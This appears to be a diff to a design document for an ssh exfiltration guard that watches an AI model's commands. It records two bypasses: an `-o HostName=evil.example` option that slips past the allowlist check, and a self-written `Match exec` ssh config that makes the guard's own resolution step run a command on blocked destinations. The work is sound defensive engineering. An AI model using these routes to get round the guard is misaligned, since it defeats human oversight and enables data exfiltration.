@@ -96,7 +96,9 @@ Behaviour:
   timeout and captured output, mirroring the `Git.run` error handling: any
   `OSError`/`SubprocessError`/timeout, or a non-zero exit, returns `[token]`
   (literal fallback). `ssh -G` only prints the effective configuration; it does
-  not open a connection.
+  not open a connection — but it is not fully side-effect-free, because it
+  evaluates `Match exec "<command>"` blocks in the config, which run a local
+  command during resolution. See open question #4.
 - Parse the `key value` lines of the output (ssh prints keys lowercased, one per
   line). Read `hostname`, `proxyjump`, `proxycommand`.
 - If `proxycommand` is present and not `none`, the session is routed through an
@@ -134,8 +136,8 @@ refused upstream, so rsync-over-ssh destinations reach the resolver as plain
 `[user@]host:path` specs.
 
 Forwarding the host-affecting `-o` settings is **correctness-critical, not merely a
-fidelity nicety**, because today's literal guard already has a hole that under-
-forwarding would leave open. `_check_ssh_family` matches only the positional host
+fidelity nicety**, because today's literal guard already has a hole that
+under-forwarding would leave open. `_check_ssh_family` matches only the positional host
 token, so `ssh -o HostName=evil.example amd-halo` is **allowed today**: the guard
 checks `amd-halo` (allowlisted), while real ssh — reading the same `-o HostName=` —
 connects to `evil.example`. If the resolver forwards `-o HostName=`/`-o Port=` to
@@ -159,6 +161,17 @@ already controls where the real `ssh` connects — so resolution introduces no
 discrepancy an attacker could exploit, and the guard's existing fail-closed
 posture is preserved: resolution only ever *adds* a block (a bad HostName,
 ProxyJump or ProxyCommand) or defers to the literal match it replaces.
+
+One caveat qualifies this and is tracked as open question #4: `ssh -G` evaluates
+`Match exec` config blocks, so a config that defines one makes resolution run a
+local command. For a command the guard would *allow*, that command would run
+anyway when the real `ssh` executes, so nothing new happens. For a command the
+guard would *block*, resolution runs the `Match exec` command once that the
+blocked `ssh` never would — and because the guard's threat model is the
+assistant itself, an assistant that writes its own `~/.ssh/config` could use
+that to run a command via the guard's resolution call even on a destination the
+guard denies. The implementer must decide how to handle this before resolving
+(see open question #4).
 
 ### Testing seam
 
@@ -244,6 +257,22 @@ network tests). CI runs all `test_exfiltration_guard_*.py` modules via
    verify whether a guard-*library* edit trips it or only workflow-file edits do).
    If it would block the change, that is a dependency to resolve before
    implementation, not a reason to weaken the check.
+4. **`Match exec` side effects of `ssh -G`.** `ssh -G` does not open a
+   connection, but it does evaluate `Match exec "<command>"` config blocks,
+   which run a local command during resolution. Because the guard's threat
+   model is the assistant itself (`docs/internals/exfiltration-guard.md`), an
+   assistant that writes its own `~/.ssh/config` with a `Match exec` directive
+   could have the guard execute that command via the resolution call — even for
+   a destination the guard ultimately blocks, where the real `ssh` would never
+   run it. Options to weigh at implementation time: accept the risk on the
+   grounds that the assistant already runs arbitrary local commands by other
+   means and resolution only shifts *when* a self-authored `Match exec` fires;
+   or run `ssh -G` with the config forced to a known-safe source (for example
+   `-F /dev/null`, which also defeats the alias resolution the task needs, so
+   this is a trade-off, not a free mitigation). Note that there is no `ssh -G`
+   flag that evaluates `Match` without its `exec` predicate. Settle this before
+   resolving, since it bears directly on whether resolution is safe to run on
+   commands that will be blocked.
 
 ## Estimated complexity
 
